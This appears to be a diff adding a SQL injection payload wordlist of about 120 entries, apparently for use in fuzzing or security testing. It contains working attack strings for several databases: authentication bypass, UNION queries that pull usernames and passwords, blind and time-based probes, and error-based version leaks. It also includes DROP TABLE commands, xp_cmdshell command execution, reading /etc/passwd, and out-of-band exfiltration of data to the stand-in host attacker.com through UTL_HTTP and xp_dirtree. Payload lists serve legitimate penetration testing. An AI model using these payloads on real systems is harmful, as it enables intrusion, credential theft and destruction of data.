@@ -1,0 +1,121 @@
+'
+"
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+') OR ('1'='1
+')) OR (('1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' ORDER BY 100--
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND (SELECT COUNT(*) FROM users)>0--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:3'--
+' AND SLEEP(5)--
+' AND SLEEP(3)--
+' OR SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+' AND BENCHMARK(5000000,SHA1('test'))--
+'; SELECT pg_sleep(5)--
+' || pg_sleep(5)--
+1; SELECT pg_sleep(3)--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND exp(~(SELECT * FROM (SELECT version())a))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
+' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+' AND LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/tmp/test.txt'--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+1; DROP TABLE users--
+1'; DROP TABLE users--
+' OR ''='
+' OR 'x'='x
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 1--
+' GROUP BY 1--
+' HAVING 1=1--
+' AND 1=(SELECT COUNT(*) FROM tabname)--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
+' AND IF(1=1,SLEEP(3),0)--
+' AND IF(1=2,SLEEP(3),0)--
+' XOR IF(1=1,SLEEP(3),0)--
+' OR IF(1=1,SLEEP(3),0)--
+' AND (SELECT * FROM (SELECT(SLEEP(3-(IF(1=1,0,3)))))a)--
+'||(SELECT '')||'
+'+(SELECT '')+' 
+' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(schema_name) AS CHAR),0x7e)) FROM information_schema.schemata LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+-1' UNION SELECT 1,2,3--
+0' UNION SELECT 1,2,3--
+null' UNION SELECT 1,2,3--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),NULL,NULL--
+' UNION SELECT database(),NULL,NULL--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1' AND '1'='1
+1' AND '1'='2
+1" AND "1"="1
+1" AND "1"="2
+%27
+%22
+%27%20OR%20%271%27%3D%271
+%27%20AND%20%271%27%3D%271
+\' OR \'1\'=\'1
+\' AND \'1\'=\'1
+' AND (SELECT * FROM users WHERE username='admin' AND password LIKE '%')--
+' UNION SELECT null,null,null,null,null--
+' UNION SELECT 1,@@version,3,4,5--
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' OR 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
+'; DECLARE @q VARCHAR(200);SET @q='\\attacker.com\share\output';EXEC master..xp_dirtree @q;--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))>64,0,5)))))a)--
+' OR (SELECT SUBSTR(username,1,1) FROM users WHERE username='admin')='a'--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users WHERE username='admin')>64--
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--
+' UNION SELECT table_name,column_name,data_type,NULL FROM information_schema.columns--
+' PROCEDURE ANALYSE()--
+' AND polygon((SELECT * FROM (SELECT * FROM (SELECT @@version)f)x))--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--
+' AND MAKE_SET(6,@:=0x0a,(SELECT(1)FROM(information_schema.columns)WHERE@:=MAKE_SET(511,@,0x3c6c693e,table_name,column_name)),@)--
